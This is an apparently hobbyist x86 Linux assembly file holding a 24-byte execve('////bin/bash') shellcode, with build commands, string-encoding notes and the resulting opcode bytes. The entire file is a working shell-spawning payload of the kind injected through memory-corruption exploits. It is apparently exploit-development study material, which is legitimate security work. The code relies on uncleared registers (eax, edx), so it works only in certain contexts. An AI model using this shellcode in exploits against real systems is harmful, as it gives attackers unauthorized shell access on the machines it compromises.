; Author Chase Hatch
; execve("////bin/bash","");
; nasm -f elf32 execve_24byte.asm -o execve_24byte.o
; ld -melf_i386 execve_24byte.o -o execve_24byte.elf 
; note the lack of an environment;  environment will be inherited, in all it's glory
; good or bad!


global _start

section .text
_start:

	mov al, 0xb
	xor ecx,ecx
	push ecx
	
; echo -n "////bin/bash" |rev |xxd -g 4 -c 4
; [#] 08/28/19 06:03:37 PM 
; 00000000: 68736162  hsab
; 00000004: 2f6e6962  /nib
; 00000008: 2f2f2f2f  //// 
	
	push dword 0x68736162
	push dword 0x2f6e6962
	push dword 0x2f2f2f2f
	mov ebx, esp
	int 0x80

; objdump -D execve_28byte.elf -Mintel
; echo -n """ b0 0b         
;  31 c9         
;  51            
;  68 62 61 73 68
;  68 62 69 6e 2f
;  68 2f 2f 2f 2f
;  89 e3         
;  cd 80""" |xxd -r -p |wc -c
; 24
